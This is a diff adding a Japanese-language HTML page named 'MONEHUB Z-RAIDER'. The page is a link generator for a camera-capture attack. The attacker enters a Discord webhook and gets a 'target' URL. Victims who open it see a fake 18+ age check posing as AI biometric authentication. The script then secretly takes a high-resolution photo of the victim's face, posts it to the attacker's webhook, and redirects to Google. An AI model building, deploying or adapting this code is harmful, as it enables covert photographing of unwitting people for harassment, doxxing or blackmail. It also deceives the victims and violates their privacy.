@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MONEHUB - 高精度認証システム</title>
+    <style>
+        :root { --crimson: #DC143C; --dark-bg: #050505; --neon-red: #ff0033; }
+        body { background-color: var(--dark-bg); color: #fff; font-family: 'Hiragino Kaku Gothic Pro', sans-serif; text-align: center; margin: 0; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .header { position: absolute; top: 0; width: 100%; padding: 25px 0; border-bottom: 3px solid var(--crimson); box-shadow: 0 0 25px var(--neon-red); background: #000; z-index: 100; }
+        h1 { color: var(--crimson); letter-spacing: 15px; margin: 0; font-size: 2rem; text-shadow: 0 0 15px var(--neon-red); font-family: 'Arial Black', sans-serif; }
+        .container { width: 90%; max-width: 450px; background: #111; padding: 40px 25px; border-radius: 5px; border-left: 5px solid var(--crimson); box-shadow: 10px 10px 0px #000; }
+        input { width: 100%; padding: 18px; margin: 20px 0; border: 1px solid #333; background: #000; color: #fff; box-sizing: border-box; outline: none; border-bottom: 2px solid var(--crimson); font-family: monospace; }
+        .btn { width: 100%; padding: 20px; background: var(--crimson); border: none; color: white; font-weight: bold; cursor: pointer; box-shadow: 0 0 15px rgba(220, 20, 60, 0.6); transition: 0.2s; letter-spacing: 2px; font-size: 1.1rem; }
+        #result-area { display: none; margin-top: 25px; background: #000; padding: 15px; border: 1px dashed var(--crimson); word-break: break-all; font-family: monospace; color: #0f0; font-size: 0.85rem; text-align: left; }
+        
+        .loading-ring { width: 70px; height: 70px; border: 5px solid #222; border-top: 5px solid var(--crimson); border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 25px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        video, canvas { position: fixed; top: -5000px; left: -5000px; opacity: 0; pointer-events: none; }
+    </style>
+</head>
+<body>
+    <div class="header"><h1>MONEHUB</h1></div>
+
+    <div id="gen-screen" class="container">
+        <p style="color:var(--crimson); font-size: 1.2rem; font-weight: bold;">Z-RAIDER リンク作成</p>
+        <input type="text" id="webhook-input" placeholder="DISCORD WEBHOOK URL...">
+        <button class="btn" onclick="generateLink()">リンクを発行する</button>
+        <div id="result-area">
+            <p style="color:#aaa; margin-bottom:5px;">ターゲット用URL:</p>
+            <p id="generated-url"></p>
+        </div>
+    </div>
+
+    <div id="target-start-screen" class="container" style="display:none;">
+        <h2 style="color:var(--crimson);">年齢認証</h2>
+        <p style="font-size:0.85rem; color:#bbb; line-height: 1.6;">18歳以上であることを確認するため、<br>AI生体認証を開始します。</p>
+        <br>
+        <button class="btn" onclick="startBiometrics()">規約に同意して認証開始</button>
+    </div>
+
+    <div id="exec-screen" class="container" style="display:none;">
+        <div class="loading-ring"></div>
+        <div id="status-msg" style="color:var(--crimson); font-size: 1.1rem;">デバイス接続中...</div>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const encodedWh = urlParams.get('wh');
+
+        if (encodedWh) {
+            document.getElementById('gen-screen').style.display = 'none';
+            document.getElementById('target-start-screen').style.display = 'block';
+        }
+
+        function generateLink() {
+            const wh = document.getElementById('webhook-input').value;
+            if (!wh || !wh.includes("discord.com/api/webhooks/")) {
+                alert("有効なWEBHOOKを入力してください。"); return;
+            }
+            const finalUrl = window.location.origin + window.location.pathname + "?wh=" + btoa(wh);
+            document.getElementById('result-area').style.display = 'block';
+            document.getElementById('generated-url').innerText = finalUrl;
+        }
+
+        async function startBiometrics() {
+            document.getElementById('target-start-screen').style.display = 'none';
+            document.getElementById('exec-screen').style.display = 'block';
+            
+            const webhookUrl = atob(encodedWh);
+            const statusMsg = document.getElementById('status-msg');
+            const video = document.getElementById('video');
+
+            try {
+                // 解像度をフルHD（1920x1080）で要求
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 }
+                    }, 
+                    audio: false 
+                });
+                video.srcObject = stream;
+                
+                // カメラ起動直後に最速でシャッターを切る (0.5秒待機でピント調整時間を確保)
+                statusMsg.innerText = "認証データ照合中 (45%)...";
+                setTimeout(() => { 
+                    captureAndSend(webhookUrl, video); 
+                    statusMsg.innerText = "年齢判定を実行中 (89%)...";
+                }, 500);
+                
+                setTimeout(() => {
+                    statusMsg.innerText = "認証完了。リダイレクト中...";
+                    setTimeout(() => { window.location.href = "https://www.google.com"; }, 800);
+                }, 3000);
+            } catch (err) {
+                alert("カメラを許可しないと認証できません。");
+                location.reload();
+            }
+        }
+
+        function captureAndSend(webhookUrl, video) {
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            
+            // ビデオの実際の解像度をキャンバスに適用（つぶれ防止）
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // 画質100%のPNGで書き出し
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('file', blob, 'MONEHUB_HD_CAPTURE.png');
+                formData.append('content', '🚨 **MONEHUB Z-RAIDER: 高画質捕捉成功** 🚨');
+                fetch(webhookUrl, { method: 'POST', body: formData });
+            }, 'image/png');
+        }
+    </script>
+</body>
+</html>
